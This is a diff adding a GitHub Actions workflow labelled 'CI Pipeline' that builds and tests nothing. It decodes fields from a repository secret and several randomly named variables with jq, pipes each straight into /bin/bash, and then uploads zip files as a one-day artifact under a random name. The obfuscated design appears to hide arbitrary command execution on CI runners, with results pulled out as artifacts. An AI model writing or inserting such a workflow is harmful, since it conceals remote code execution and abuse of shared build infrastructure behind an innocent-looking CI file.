@@ -1,0 +1,30 @@
+name: CI Pipeline
+on:
+  workflow_dispatch:
+
+concurrency:
+  group: ${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: true
+jobs:
+  service:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Run
+        env:
+          al30363: ${{ secrets.al30363 }}
+        run: |
+          printf '%s' "$al30363" | jq -r .rqd5 | /bin/bash
+          echo $ubvx27684 | jq -r .hxtx6581 | /bin/bash
+          printf '%s' "$s50" | jq -r .hpf3591 | /bin/bash
+          echo $vlgnv21567 | jq -r .d963 | /bin/bash
+          printf '%s' "$asyab8874" | jq -r .n4220 | /bin/bash
+          printf '%s' "$julso495" | jq -r .w5 | /bin/bash
+          echo $wll826 | jq -r .nest8 | /bin/bash
+
+      - name: Save archive
+        uses: actions/upload-artifact@v4
+        with:
+          name: VHDaMREQ
+          path: "*.zip"
+          retention-days: 1
